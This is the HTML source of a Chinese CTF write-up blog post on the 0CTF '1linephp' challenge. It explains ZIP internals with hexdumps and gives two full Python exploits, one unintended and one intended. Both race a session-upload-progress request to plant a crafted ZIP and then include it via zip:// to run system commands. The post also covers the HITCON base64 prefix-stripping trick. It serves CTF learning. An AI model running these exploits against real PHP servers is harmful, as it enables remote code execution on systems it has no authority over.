@@ -1,0 +1,481 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"123-prog.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="0x01源码 12&lt;?php($_&#x3D;@$_GET[&amp;#x27;yxxx&amp;#x27;].&amp;#x27;.php&amp;#x27;) &amp;&amp; @substr(file($_)[0],0,6) &#x3D;&#x3D;&#x3D; &amp;#x27;@&lt;?php&amp;#x27; ? include($_) : highlight_file(__FILE__) &amp;&amp; include(&amp;#x27;phpinfo.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TCTF-0CTF 1linephp">
+<meta property="og:url" content="https://123-prog.github.io/2021/07/18/TCTF-0CTF-1linephp/index.html">
+<meta property="og:site_name" content="nappingCat&#39;s Blog">
+<meta property="og:description" content="0x01源码 12&lt;?php($_&#x3D;@$_GET[&amp;#x27;yxxx&amp;#x27;].&amp;#x27;.php&amp;#x27;) &amp;&amp; @substr(file($_)[0],0,6) &#x3D;&#x3D;&#x3D; &amp;#x27;@&lt;?php&amp;#x27; ? include($_) : highlight_file(__FILE__) &amp;&amp; include(&amp;#x27;phpinfo.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://123-prog.github.io/2021/07/18/TCTF-0CTF-1linephp/Snipaste_2021-07-19_10-58-03.png">
+<meta property="og:image" content="https://123-prog.github.io/2021/07/18/TCTF-0CTF-1linephp/Snipaste_2021-07-19_11-07-28.png">
+<meta property="og:image" content="https://123-prog.github.io/2021/07/18/TCTF-0CTF-1linephp/Snipaste_2021-07-19_11-09-35.png">
+<meta property="article:published_time" content="2021-07-18T15:35:46.000Z">
+<meta property="article:modified_time" content="2021-07-20T15:37:38.838Z">
+<meta property="article:author" content="nappingCat">
+<meta property="article:tag" content="zip伪协议">
+<meta property="article:tag" content="包含session文件getshell">
+<meta property="article:tag" content="畸形zip">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://123-prog.github.io/2021/07/18/TCTF-0CTF-1linephp/Snipaste_2021-07-19_10-58-03.png">
+
+<link rel="canonical" href="https://123-prog.github.io/2021/07/18/TCTF-0CTF-1linephp/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>TCTF-0CTF 1linephp | nappingCat's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">nappingCat's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://123-prog.github.io/2021/07/18/TCTF-0CTF-1linephp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="nappingCat">
+      <meta itemprop="description" content="2571374157@qq.com">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="nappingCat's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          TCTF-0CTF 1linephp
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-07-18 23:35:46" itemprop="dateCreated datePublished" datetime="2021-07-18T23:35:46+08:00">2021-07-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-07-20 23:37:38" itemprop="dateModified" datetime="2021-07-20T23:37:38+08:00">2021-07-20</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">web刷题记录</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">(<span class="variable">$_</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;yxxx&#x27;</span>].<span class="string">&#x27;.php&#x27;</span>) &amp;&amp; @substr(file(<span class="variable">$_</span>)[<span class="number">0</span>],<span class="number">0</span>,<span class="number">6</span>) === <span class="string">&#x27;@&lt;?php&#x27;</span> ? <span class="keyword">include</span>(<span class="variable">$_</span>) : highlight_file(<span class="keyword">__FILE__</span>) &amp;&amp; <span class="keyword">include</span>(<span class="string">&#x27;phpinfo.html&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<a id="more"></a>
+
+<p>需要满足文件后缀为<code>php</code>，文件内容开头为<code>@&lt;?php</code></p>
+<p>上传文件，post <code>PHP_SESSION_UPLOAD_PROGRESS</code>变量，向session文件中插入payload</p>
+<p>zip://伪协议包含session文件</p>
+<h3 id="0x02-zip文件结构"><a href="#0x02-zip文件结构" class="headerlink" title="0x02 zip文件结构"></a>0x02 zip文件结构</h3><p>zip文件可以看作三部分组成</p>
+<blockquote>
+<p>压缩源文件数据区（包括文件头，文件数据，数据描述符等等，每个文件都有这么一份空间）</p>
+<p>核心目录</p>
+<p>目录结束标志</p>
+</blockquote>
+<p>一个例子：shell.zip(包含一个文件，shell.php)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">00000000  50 4b 03 04 0a 00 00 00  00 00 45 bc f2 52 19 fa  |PK........E..R..|</span><br><span class="line">00000010  6f fc 41 00 00 00 41 00  00 00 09 00 1c 00 73 68  |o.A...A.......sh|</span><br><span class="line">00000020  65 6c 6c 2e 70 68 70 55  54 09 00 03 f2 49 f4 60  |ell.phpUT....I.&#96;|</span><br><span class="line">00000030  8c 48 f4 60 75 78 0b 00  01 04 e8 03 00 00 04 e8  |.H.&#96;ux..........|</span><br><span class="line">00000040  03 00 00 40 3c 3f 70 68  70 0a 65 63 68 6f 20 22  |...@&lt;?php.echo &quot;|</span><br><span class="line">00000050  6e 61 70 70 69 6e 67 43  34 74 20 79 6f 75 20 67  |nappingC4t you g|</span><br><span class="line">00000060  6f 74 20 69 74 21 22 2e  27 3c 62 72 3e 27 3b 0a  |ot it!&quot;.&#39;&lt;br&gt;&#39;;.|</span><br><span class="line">00000070  73 79 73 74 65 6d 28 27  77 68 6f 61 6d 69 27 29  |system(&#39;whoami&#39;)|</span><br><span class="line">00000080  3b 3f 3e 0a 50 4b 01 02  1e 03 0a 00 00 00 00 00  |;?&gt;.PK..........|</span><br><span class="line">00000090  45 bc f2 52 19 fa 6f fc  41 00 00 00 41 00 00 00  |E..R..o.A...A...|</span><br><span class="line">000000a0  09 00 18 00 00 00 00 00  01 00 00 00 a4 81 00 00  |................|</span><br><span class="line">000000b0  00 00 73 68 65 6c 6c 2e  70 68 70 55 54 05 00 03  |..shell.phpUT...|</span><br><span class="line">000000c0  f2 49 f4 60 75 78 0b 00  01 04 e8 03 00 00 04 e8  |.I.&#96;ux..........|</span><br><span class="line">000000d0  03 00 00 50 4b 05 06 00  00 00 00 01 00 01 00 4f  |...PK..........O|</span><br><span class="line">000000e0  00 00 00 84 00 00 00 00  00                       |.........|</span><br><span class="line">000000e9</span><br></pre></td></tr></table></figure>
+<p><strong>首先看源文件数据区，即从文件头标识（<code>0x04034b50</code>）到核心目录文件头（<code>0x02014b50</code>)的部分</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00000000  50 4b 03 04 0a 00 00 00  00 00 45 bc f2 52 19 fa  |PK........E..R..|</span><br><span class="line">00000010  6f fc 41 00 00 00 41 00  00 00 09 00 1c 00 73 68  |o.A...A.......sh|</span><br><span class="line">00000020  65 6c 6c 2e 70 68 70 55  54 09 00 03 f2 49 f4 60  |ell.phpUT....I.&#96;|</span><br><span class="line">00000030  8c 48 f4 60 75 78 0b 00  01 04 e8 03 00 00 04 e8  |.H.&#96;ux..........|</span><br><span class="line">00000040  03 00 00 40 3c 3f 70 68  70 0a 65 63 68 6f 20 22  |...@&lt;?php.echo &quot;|</span><br><span class="line">00000050  6e 61 70 70 69 6e 67 43  34 74 20 79 6f 75 20 67  |nappingC4t you g|</span><br><span class="line">00000060  6f 74 20 69 74 21 22 2e  27 3c 62 72 3e 27 3b 0a  |ot it!&quot;.&#39;&lt;br&gt;&#39;;.|</span><br><span class="line">00000070  73 79 73 74 65 6d 28 27  77 68 6f 61 6d 69 27 29  |system(&#39;whoami&#39;)|</span><br><span class="line">00000080  3b 3f 3e 0a                                       |;?&gt;.</span><br></pre></td></tr></table></figure>
+<p>其中包含了文件头，文件数据，数据描述符（这里没有）</p>
+<p>文件头的结构如下：</p>
+<p><img src="/2021/07/18/TCTF-0CTF-1linephp/Snipaste_2021-07-19_10-58-03.png"></p>
+<p>文件数据部分记录了压缩文件中的数据，示例zip包中没有数据描述符，用于标识文件压缩结束，磁盘上的zip文件通常没有这个部分</p>
+<p><strong>第二部分看核心目录区，由核心目录文件头（<code>0x02014b50</code>)到核心目录结束标志（<code>0x06054b50</code>）</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00000080		      50 4b 01 02  1e 03 0a 00 00 00 00 00  |    PK..........|</span><br><span class="line">00000090  45 bc f2 52 19 fa 6f fc  41 00 00 00 41 00 00 00  |E..R..o.A...A...|</span><br><span class="line">000000a0  09 00 18 00 00 00 00 00  01 00 00 00 a4 81 00 00  |................|</span><br><span class="line">000000b0  00 00 73 68 65 6c 6c 2e  70 68 70 55 54 05 00 03  |..shell.phpUT...|</span><br><span class="line">000000c0  f2 49 f4 60 75 78 0b 00  01 04 e8 03 00 00 04 e8  |.I.&#96;ux..........|</span><br><span class="line">000000d0  03 00 00                                          |...</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/07/18/TCTF-0CTF-1linephp/Snipaste_2021-07-19_11-07-28.png"></p>
+<p><strong>第三部分就是End of central directory record(EOCD) 目录结束标识</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">000000d0           50 4b 05 06 00  00 00 00 01 00 01 00 4f  |   PK..........O|</span><br><span class="line">000000e0  00 00 00 84 00 00 00 00  00                       |.........|</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/07/18/TCTF-0CTF-1linephp/Snipaste_2021-07-19_11-09-35.png"></p>
+<h3 id="0x03-非预期解"><a href="#0x03-非预期解" class="headerlink" title="0x03 非预期解"></a>0x03 非预期解</h3><p>题目的思路无非就是通过<code>PHP_SESSION_UPLOAD_PROGRESS</code>变量构造一个ZIP包，但是写进session的时候，变量前面会有一个前缀，看配置知道是<code>upload_progress_</code>，所以现在问题是，如何在这个前缀存在的情况下，使得我们的zip读取不会出问题</p>
+<p>非预期解原理是，<strong>zip的前26个字节（直到长度位部分）的改动是不会影响</strong>我们zip://协议对文件的读取，所以解法是，<code>upload_progress_</code>长度为16，<strong>删除zip包开头相等长度部分</strong>，将剩余部分作为<code>PHP_SESSION_UPLOAD_PROGRESS</code>变量的值传入，再用zip协议读取</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">poc = <span class="string">&#x27;&#x27;&#x27;@&lt;?php</span></span><br><span class="line"><span class="string">echo &quot;nappingC4t&quot;;</span></span><br><span class="line"><span class="string">system(&#x27;whoami&#x27;);?&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;./shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">f.write(poc)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&#x27;rm -rf ./shell.zip;zip shell.zip shell.php&#x27;</span>)</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;./shell.zip&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">ZipContent = f.read()</span><br><span class="line">f.close()</span><br><span class="line"><span class="comment">#print(ZipContent)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_payload</span>(<span class="params">prefix</span>):</span></span><br><span class="line">    offset = <span class="built_in">len</span>(prefix)</span><br><span class="line">    <span class="keyword">return</span> ZipContent[offset:]  <span class="comment">#截断前面部分字节</span></span><br><span class="line">    </span><br><span class="line">prefix = <span class="string">b&#x27;upload_progress_&#x27;</span></span><br><span class="line">payload = get_payload(prefix)</span><br><span class="line"><span class="comment">#print(payload)</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1/1.php&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span>*<span class="number">1024</span>*<span class="number">1024</span>)</span><br><span class="line">        r = session.post(url, data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:payload&#125;, files=&#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;1.txt&#x27;</span>,f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:<span class="string">&#x27;C4t&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        url = <span class="string">&#x27;http://127.0.0.1/1.php?yxxx=zip:///tmp/sess_C4t&#x27;</span>+<span class="string">&#x27;%23&#x27;</span>+<span class="string">&#x27;shell&#x27;</span></span><br><span class="line">        r = session.post(url,data=&#123;&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;nappingC4t&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            print(r.text)</span><br><span class="line">            event.clear()</span><br><span class="line">            sys.exit()</span><br><span class="line"></span><br><span class="line">event = threading.Event()</span><br><span class="line"><span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">        threading.Thread(target=read,args=(session,)).start()</span><br><span class="line">event.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>
+<h3 id="0x04-预期解"><a href="#0x04-预期解" class="headerlink" title="0x04 预期解"></a>0x04 预期解</h3><p>构造畸形zip:</p>
+<p>更改核心目录的42<del>46位（本地文件头的偏移），和更改目录结束标志的16</del>20位（核心目录开始位置相对于archive的位移），加上<code>upload_progress_</code>的长度即可</p>
+<p>这样读取的时候就可以无视前缀了</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">poc = <span class="string">&#x27;&#x27;&#x27;@&lt;?php</span></span><br><span class="line"><span class="string">echo &quot;nappingC4t&quot;;</span></span><br><span class="line"><span class="string">system(&#x27;whoami&#x27;);</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">f.write(poc)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&#x27;rm -rf ./shell.zip;zip shell.zip shell.php&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;shell.zip&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">ZipContent = f.read()</span><br><span class="line">f.close()</span><br><span class="line"><span class="comment">#print(ZipContent)</span></span><br><span class="line"></span><br><span class="line">central_directory_idx = ZipContent.index(<span class="string">b&#x27;\x50\x4b\x01\x02&#x27;</span>)</span><br><span class="line">end_of_central_directory_idx = ZipContent.index(<span class="string">b&#x27;\x50\x4b\x05\x06&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#local file header + file data + data descriptor</span></span><br><span class="line">lfd = ZipContent[:central_directory_idx]</span><br><span class="line"><span class="comment">#核心目录</span></span><br><span class="line">central_directory = ZipContent[central_directory_idx:end_of_central_directory_idx]</span><br><span class="line"><span class="comment">#结尾</span></span><br><span class="line">end_central_directory = ZipContent[end_of_central_directory_idx:]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_payload</span>(<span class="params">offset</span>):</span></span><br><span class="line">    header_offset = u32(central_directory[<span class="number">42</span>:<span class="number">46</span>])</span><br><span class="line">    archive_offset = u32(end_central_directory[<span class="number">16</span>:<span class="number">20</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> lfd + central_directory[:<span class="number">42</span>] + p32(header_offset+offset) + central_directory[<span class="number">46</span>:] + end_central_directory[:<span class="number">16</span>] + p32(archive_offset+offset) + end_central_directory[<span class="number">20</span>:]</span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&#x27;upload_progress_&#x27;</span></span><br><span class="line">payload = get_payload(<span class="built_in">len</span>(prefix))</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1/1.php&#x27;</span></span><br><span class="line">sessid = <span class="string">&#x27;c4t&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span>*<span class="number">1024</span>*<span class="number">1024</span>)</span><br><span class="line">    session.post(url, data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:payload&#125;, files=&#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;1.txt&#x27;</span>,f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sessid&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    r = session.post(url=<span class="string">&#x27;http://127.0.0.1/1.php?yxxx=zip:///tmp/sess_&#x27;</span>+sessid+<span class="string">&#x27;%23&#x27;</span>+<span class="string">&#x27;shell&#x27;</span>, data=&#123;&#125;)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;nappingC4t&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        print(r.text)</span><br><span class="line">        event.clear()</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">event = threading.Event()</span><br><span class="line"><span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">    threading.Thread(target=write, args=(session,)).start()</span><br><span class="line">    threading.Thread(target=read, args=(session,)).start()</span><br><span class="line">event.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>
+<h3 id="0x05-hitcon2018-One-Line-PHP-Challenge"><a href="#0x05-hitcon2018-One-Line-PHP-Challenge" class="headerlink" title="0x05 hitcon2018 One Line PHP Challenge"></a>0x05 hitcon2018 One Line PHP Challenge</h3><p>题目也是一句话</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">(<span class="variable">$_</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;orange&#x27;</span>]) &amp;&amp; @substr(file(<span class="variable">$_</span>)[<span class="number">0</span>],<span class="number">0</span>,<span class="number">6</span>) === <span class="string">&#x27;@&lt;?php&#x27;</span> ? <span class="keyword">include</span>(<span class="variable">$_</span>) : highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+<p>与上面不同的地方，就是没有限定包含文件的后缀，只限定了内容</p>
+<p>这里没有<code>phpinfo</code>，无法通过包含上传文件的临时文件拿到shell，上面那题phpinfo是写死的，也不能</p>
+<p>这题还是包含session文件，解决前缀的问题是通过base64多次解密消除前缀</p>
+<p>原理是，对于不在base64编码字符集内的字符，解码的时候会忽略，所以，多次解密后可能会得到解密结果为空的情况，利用这一特点，结合php://协议对从session文件通过多次解密读出来就可以消除前缀对我们的影响了</p>
+<p>需要注意的问题所在：</p>
+<blockquote>
+<p>1.bas64解密是以4个字符一组，所以我们需要构造一个前缀（构造的方式就是在原来前缀后添加随机的字符），满足：</p>
+<blockquote>
+<p>有限次解密之后为空</p>
+<p>每次解密得到的结果中有效字符（在字符集中的字符）必须是4的整数，防止不够4个一组影响我们后面的真正的payload部分</p>
+<p>解码过程中不能出现=，对于base64来说，等号只会出现在最后面，在中间出现会让接下来的解码出错</p>
+</blockquote>
+<p>2.我们的payload，即脚本中的poc部分，需要进行指定次数的base64-encode，这个encode的过程也不能出现<code>=</code>，在session文件中，我们构造的部分数据是处于中间位置，中间位置就不能出现<code>=</code>，如何让<code>=</code>不出现，很简单，只要满足这样的条件：</p>
+<blockquote>
+<p>因为加密过程是3个字符一组，加密后3个字符会变成4个字符，<code>=</code>的出现是加密字符串长度不是3的倍数，我们只要构造长度为3的倍数即可，加密n次的话，就构造长度为3^n的倍数，在原本的payload后添加任意字符即可</p>
+</blockquote>
